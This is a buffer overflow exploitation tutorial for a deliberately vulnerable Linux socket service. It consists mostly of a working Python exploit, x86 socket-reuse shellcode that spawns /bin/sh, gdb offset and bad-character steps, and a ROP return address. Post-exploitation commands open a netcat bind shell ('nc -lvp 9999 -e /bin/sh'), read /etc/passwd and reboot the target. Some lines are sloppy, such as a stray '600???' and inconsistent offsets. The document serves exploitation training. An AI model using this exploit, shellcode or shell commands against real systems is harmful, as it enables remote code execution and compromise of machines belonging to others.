# Remote Stack buffer overflow - Linux Exploiting
## Part II - Overflow
---
## Step by step guide
### Sofware:

- Vulnerble App (created by Master Dreg)
- nano
- gdb
- VMVirtualbox
- netcat

### OS:
- Kali linux
---

## Objectives:

Our goal is to exploit the vulnerability of the "space" service that is generated from the following c script. To achieve the exploitation, we will introduce our "malicious" code to the application through the socket.
The vulnerable c function:

```c
#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <string.h> 

#define PORT 8080 
#define BUFFSIZZ 1024
#define BUFFSIZ 512

int new_socket = 0; 
int valread = 0; 
int server_fd = 0;
struct sockaddr_in address = { 0 }; 
int opt = 1; 
int addrlen = sizeof(address);


#define WELCOME_MSG "wellcome to spaceservice, enter your password\n"

#pragma pack(1)
typedef struct  mybf_s
{
    char pass[BUFFSIZ];
     struct  mybf_s * selfptr;
} mybf;



void ask_login(void)
{
    mybf buffer = {0};

    buffer.selfptr = &buffer;

    printf("0x%08X\n", buffer.pass);
    send(new_socket , WELCOME_MSG , sizeof(WELCOME_MSG) - 1, 0 ); 
    valread = read( new_socket , buffer.pass, BUFFSIZZ - 1); 
    send(new_socket , buffer.pass, BUFFSIZZ - 1, 0 );

    printf("0x%08X\n", buffer.pass);
    send(new_socket , WELCOME_MSG , sizeof(WELCOME_MSG) - 1, 0 ); 
    valread = read( new_socket , buffer.pass, BUFFSIZZ - 1); 
}

int main(int argc, char const *argv[]) 
{ 
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 
    { 
        perror("socket failed"); 
        exit(EXIT_FAILURE); 
    }  
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) 
    { 
        perror("setsockopt"); 
        exit(EXIT_FAILURE); 
    } 
    address.sin_family = AF_INET; 
    address.sin_addr.s_addr = INADDR_ANY; 
    address.sin_port = htons( PORT ); 

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) 
    { 
        perror("bind failed"); 
        exit(EXIT_FAILURE); 
    } 
    if (listen(server_fd, 3) < 0) 
    { 
        perror("listen"); 
        exit(EXIT_FAILURE); 
    } 
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) 
    { 
        perror("accept"); 
        exit(EXIT_FAILURE); 
    } 

    ask_login();

    return 0; 
} 
```
This is our base Python script to hack the vulnerable application.

```python
#!/usr/bin/env python 

from time import sleep
import os
import socket
import sys

host = '127.0.0.1'
port = 8080

leakbuff = '\x41' * 512;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

sleep(1)
print(s.recv(1024))
sleep(1)
s.send(leakbuff)
sleep(1)
data = s.recv(1024)
print(":".join("{:02x}".format(ord(c)) for c in data))
buff_addr = data[512:]
buff_addr = buff_addr[:4]
print("exploiting....")
print(":".join("{:02x}".format(ord(c)) for c in buff_addr))


# http://shell-storm.org/shellcode/files/shellcode-881.php
# 50 bytes
# Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes
# <zadyree@tuxfamily.org>
# Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +
shellcode = '\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6'
shellcode += '\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80'
shellcode += '\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6'
shellcode += '\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
shellcode += '\x89\xe3\x31\xc9\xcd\x80'

buffer = '\x41' * 600???

print(":".join("{:02x}".format(ord(c)) for c in buffer))

sleep(1)
s.send(buffer)
sleep(1)


s.send("nohup nc -lvp 9999 -e /bin/sh &\n")
sleep(2)
s.send("uname -a\n")
sleep(2)
print(s.recv(1024))
s.send("id\n")
sleep(2)
print(s.recv(1024))
s.send("cat /etc/passwd\n")
sleep(4)
print(s.recv(9024))
raw_input("Press Enter to reboot the machine...")
print("\n\nrebooting the remote machine!\n\n")
s.send("reboot\n")
sleep(4)

s.close()

```
And this is the Shell code in linux assembler
```sh
/* Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes
* <zadyree@tuxfamily.org>
*
* Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +
* execve /bin/sh
*
* Thanks: Charles Stevenson, ipv, 3LRVS research team
*
* gcc -o socket_reuse socket_reuse.c -z execstack
*/

char shellcode[]= /* We use sys_dup(2) to get the previous attributed sockfd */
"\x6a\x02"      // push 0x2
"\x5b"          // pop ebx
"\x6a\x29"      // push 0x29
"\x58"          // pop eax
"\xcd\x80"      // int 0x80 -> call dup(2)
"\x48"          // dec eax
/* Now EAX = our Socket File Descriptor */

"\x89\xc6"      // mov esi, eax

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */
"\x31\xc9"                  // xor    %ecx,%ecx
"\x56"                      // push   %esi
"\x5b"                      // pop    %ebx
// loop:
"\x6a\x3f"                  // push   $0x3f
"\x58"                      // pop    %eax
"\xcd\x80"                  // int    $0x80
"\x41"                      // inc    %ecx
"\x80\xf9\x03"              // cmp    $0x3,%cl
"\x75\xf5"                  // jne    80483e8 <loop>

/* execve /bin/sh by ipv */
"\x6a\x0b"                  // push byte 0xb
"\x58"                      // pop eax
"\x99"                      // cdq
"\x52"                      // push edx
"\x31\xf6"                  // xor esi, esi - We add those instructions
"\x56"                      // push esi     - to clean up the arg stack
"\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e"      // push dword 0x6e69922f
"\x89\xe3"                  // mov ebx, esp
"\x31\xc9"                  // xor ecx, ecx
"\xcd\x80";                 // int 0x80
;

/* 

shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";

*/


int main(void)
{
 printf("Shellcode length: %d\n", strlen(shellcode));
 (*(void(*)()) shellcode)();  
 return 0;
}
```
One of the advantages of this shellcode is the use of the connection with the service itself, supplanting the connection without having to create a new one, thus achieving less exposure to subsequent detection.

---

## First spteps

Open the vulnerable app on gdb and run it, add the A's string to the script and execute it, let's see now what is happening on the debugger.
```sh
gdb ./spaceservice
gef➤  run
```
```python
buffer = '\x41' * 1000
```
```sh
wellcome to spaceservice, enter your password

41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:8c:ce:ff:ff:00:c0:04:08:00:10:fb:f7:a8:d0:ff:ff:88:94:04:08:c0:d0:ff:ff:00:00:00:00:00:00:00:00:46:ae:de:f7:00:10:fb:f7:00:10:fb:f7:00:00:00:00:46:ae:de:f7:01:00:00:00:64:d1:ff:ff:6c:d1:ff:ff:f4:d0:ff:ff:04:d1:ff:ff:40:db:ff:f7:10:b4:fc:f7:00:10:fb:f7:01:00:00:00:00:00:00:00:48:d1:ff:ff:00:00:00:00:00:d0:ff:f7:00:00:00:00:00:10:fb:f7:00:10:fb:f7:00:00:00:00:24:cc:b9:42:34:b2:43:00:00:00:00:00:00:00:00:00:00:00:00:00:01:00:00:00:f0:90:04:08:00:00:00:00:40:97:fe:f7:80:40:fe:f7:00:c0:04:08:01:00:00:00:f0:90:04:08:00:00:00:00:22:91:04:08:08:93:04:08:01:00:00:00:64:d1:ff:ff:a0:94:04:08:00:95:04:08:80:40:fe:f7:5c:d1:ff:ff:1c:00:00:00:01:00:00:00:13:d3:ff:ff:00:00:00:00:44:d3:ff:ff:72:d3:ff:ff:be:d3:ff:ff:d0:d3:ff:ff:e0:d3:ff:ff:f9:d3:ff:ff:26:d4:ff:ff:56:d4:ff:ff:94:d4:ff:ff:b5:d4:ff:ff:bf:d4:ff:ff:d5:d4:ff:ff:0f:d5:ff:ff:1f:d5:ff:ff:55:d5:ff:ff:60:d5:ff:ff:6f:d5:ff:ff:b7:d5:ff:ff:d0:d5:ff:ff:e1:d5:ff:ff:06:d6:ff:ff:19:d6:ff:ff:26:d6:ff:ff:44:d6:ff:ff:78:d6:ff:ff:97:d6:ff:ff:a8:d6:ff:ff:bb:d6:ff:ff:d0:d6:ff:ff:43:d7:ff:ff:86:d7:ff:ff:a5:d7:ff:ff:c0:d7:ff:ff:e8:d7:ff:ff:0a:d8:ff:ff:56:d8:ff:ff:6a:d8:ff:ff:81:d8:ff:ff:9d:d8:ff:ff:b1:d8:ff:ff:be:d8:ff:ff:c6:d8:ff:ff:f1:d8:ff:ff:e0:de:ff:ff:f8:de:ff:ff:10:df:ff:ff:25:df:ff:ff:3e:df:ff:ff:53:df:ff:ff:6b:df:ff:ff:80:df:ff:ff:b3:df:ff:ff:bc:df:ff:ff:00:00:00:00:20:00:00:00:50:15:fd:f7:21:00:00:00:00:10:fd:f7:10:00:00:00:ff:fb:8b:17:06:00:00:00:00:10:00:00:11:00:00:00:64:00:00:00:03:00:00:00:34:80:04:08:04:00:00:00:20:00:00:00:05:00:00:00:0b:00:00:00:07:00:00:00:00:30:fd:77
exploiting....
8c:ce:ff:ff
41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41
ellcome to spaceservice, enter your password
```
```sh
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────── registers ────
$eax   : 0x3e8     
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$edx   : 0x3ff     
$esp   : 0xffffd0a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7fb1000  →  0x001e4d6c
$edi   : 0x41414141 ("AAAA"?)
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
```

As you can see in the registers in the stack, full of \ x41,( eip) the program has crashed just as we expected. The buffer overflow has occurred!

---

Let's continue with the next step, generating a pattern string with gdb that we will copy to our script for a later comparison that we will perform from gdb. to perform this task we type in gdb:
```sh
gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj

```
```python
#buffer = '\x41' * 1000
buffer = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap>
```
Run the program with gdb and execute the script 
```sh
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────── registers ────
$eax   : 0x3e8     
$ebx   : 0x66616165 ("eaaf"?)
$ecx   : 0xffffce8c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x3ff     
$esp   : 0xffffd0a0  →  "iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]"
$ebp   : 0x66616167 ("gaaf"?)
$esi   : 0xf7fb1000  →  0x001e4d6c
$edi   : 0x66616166 ("faaf"?)
$eip   : 0x66616168 ("haaf"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────── stack ────
0xffffd0a0│+0x0000: "iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]" ← $esp
0xffffd0a4│+0x0004: "jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafva[...]"
0xffffd0a8│+0x0008: "kaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwa[...]"
0xffffd0ac│+0x000c: "laafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxa[...]"
0xffffd0b0│+0x0010: "maafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafya[...]"
0xffffd0b4│+0x0014: "naafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafza[...]"
0xffffd0b8│+0x0018: "oaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagba[...]"
0xffffd0bc│+0x001c: "paafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagca[...]"
────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x66616168
────────────────────────── threads ────
[#0] Id 1, Name: "spaceservice", stopped 0x66616168 in ?? (), reason: SIGSEGV
──────────────────────────── trace ────
```
Check the pattern offset, use the eip address
```sh
gef➤  pattern offset 0x66616168
[+] Searching '0x66616168'
[+] Found at offset 528 (little-endian search) likely
[+] Found at offset 720 (big-endian search) 

```
Time to check the full size including also the return address, just add the ret address to the script and repeat the proccess.
```python
buffer = '\x41' * 528
buffer +='\x42\x42\x42\x42'
```
```sh
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x214     
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$edx   : 0x3ff     
$esp   : 0xffffd0a0  →  0xffffd0c0  →  0x00000001
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7fb1000  →  0x001e4d6c
$edi   : 0x41414141 ("AAAA"?)
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd0a0│+0x0000: 0xffffd0c0  →  0x00000001	 ← $esp
0xffffd0a4│+0x0004: 0x00000000
0xffffd0a8│+0x0008: 0x00000000
0xffffd0ac│+0x000c: 0xf7deae46  →  <__libc_start_main+262> add esp, 0x10
0xffffd0b0│+0x0010: 0xf7fb1000  →  0x001e4d6c
0xffffd0b4│+0x0014: 0xf7fb1000  →  0x001e4d6c
0xffffd0b8│+0x0018: 0x00000000
0xffffd0bc│+0x001c: 0xf7deae46  →  <__libc_start_main+262> add esp, 0x10
──────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "spaceservice", stopped 0x42424242 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────── trace ────
```
Check if there is some bad chars that can prevent the shellcode execution, type now 
```sh
gef➤  bytearray
[+] Generating table, excluding 0 bad chars...
[+] Dumping table to file
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

[+] Done, wrote 256 bytes to file bytearray.txt
[+] Binary output saved in bytearray.bin

```
Add this lines to the python script with buffer +="" and run the program and execute the exploit
```sh
gef➤  hexdump $esp
0xffffd0a0     00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f    ................
0xffffd0b0     10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f    ................
0xffffd0c0     20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f     !"#$%&'()*+,-./
0xffffd0d0     30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f    0123456789:;<=>?

```
```sh
gef➤  bincompare -f /home/kali/Desktop/spaceservice_b0f/bytearray.bin -a 0xffffd0a0
[+] Comparison result:
    +-----------------------------------------------+
 00 |00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f| file
    |                                               | memory
 10 |10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f| file
    |                                               | memory
 20 |20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f| file
    |                                               | memory
 30 |30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f| file
    |                                               | memory
 40 |40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f| file
    |                                               | memory
 50 |50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f| file
    |                                               | memory
 60 |60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f| file
    |                                               | memory
 70 |70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f| file
    |                                               | memory
 80 |80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| file
    |                                               | memory
 90 |90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| file
    |                                               | memory
 a0 |a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| file
    |                                               | memory
 b0 |b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| file
    |                                               | memory
 c0 |c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| file
    |                                               | memory
 d0 |d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| file
    |                                               | memory
 e0 |e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| file
    |                                               | memory
 f0 |f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| file
    |                                               | memory
    +-----------------------------------------------+

[+] No badchars found!
```
insert 20 'x90' (nop) after the return address 
```sh
buffer = '\x41' * 532
buffer +='\x42\x42\x42\x42'
buffer +='\x90' * 20
```
run all again! type this command to find a valid return address, and add it to the scritp
```sh
gef➤  ropper --search "push esp"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: push esp

[INFO] File: /home/kali/Desktop/spaceservice_b0f/spaceservice
0x08049121: push esp; mov ebx, dword ptr [esp]; ret; 

***********************
buffer = '\x41' * 528
buffer +='\x21\x91\x04\x08' #0x08049121
buffer += '\x90' * 20

```
To check if the full shellcode is on the stack add an \xcc (interrupt) before the shellcode to check everyting on gdb, our final script:
```python
shellcode = '\xcc\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6'
shellcode += '\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80'
shellcode += '\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6'
shellcode += '\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
shellcode += '\x89\xe3\x31\xc9\xcd\x80'

buffer = '\x41' * 528
buffer +='\x21\x91\x04\x08' #0x08049121
buffer += '\x90' * 20
buffer += shellcode
```
Check the code with 
```sh
gef➤  hexdump $eip 0x100
0xffffd0b5     6a 02 5b 6a 29 58 cd 80 48 89 c6 31 c9 56 5b 6a    j.[j)X..H..1.V[j
0xffffd0c5     3f 58 cd 80 41 80 f9 03 75 f5 6a 0b 58 99 52 31    ?X..A...u.j.X.R1
0xffffd0d5     f6 56 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31 c9    .Vh//shh/bin..1.
0xffffd0e5     cd 80 00 48 d1 ff ff 00 00 00 00 00 d0 ff f7 00    ...H............
0xffffd0f5     00 00 00 00 10 fb f7 00 10 fb f7 00 00 00 00 66    ...............f
0xffffd105     4b 7b cf 76 35 81 8d 00 00 00 00 00 00 00 00 00    K{.v5...........
0xffffd115     00 00 00 01 00 00 00 f0 90 04 08 00 00 00 00 40    ...............@
0xffffd125     97 fe f7 80 40 fe f7 00 c0 04 08 01 00 00 00 f0    ....@...........
0xffffd135     90 04 08 00 00 00 00 22 91 04 08 08 93 04 08 01    ......."........
0xffffd145     00 00 00 64 d1 ff ff a0 94 04 08 00 95 04 08 80    ...d............
0xffffd155     40 fe f7 5c d1 ff ff 1c 00 00 00 01 00 00 00 13    @..\............
0xffffd165     d3 ff ff 00 00 00 00 44 d3 ff ff 72 d3 ff ff be    .......D...r....
0xffffd175     d3 ff ff d0 d3 ff ff e0 d3 ff ff f9 d3 ff ff 26    ...............&
0xffffd185     d4 ff ff 56 d4 ff ff 94 d4 ff ff b5 d4 ff ff bf    ...V............
0xffffd195     d4 ff ff d5 d4 ff ff 0f d5 ff ff 1f d5 ff ff 55    ...............U
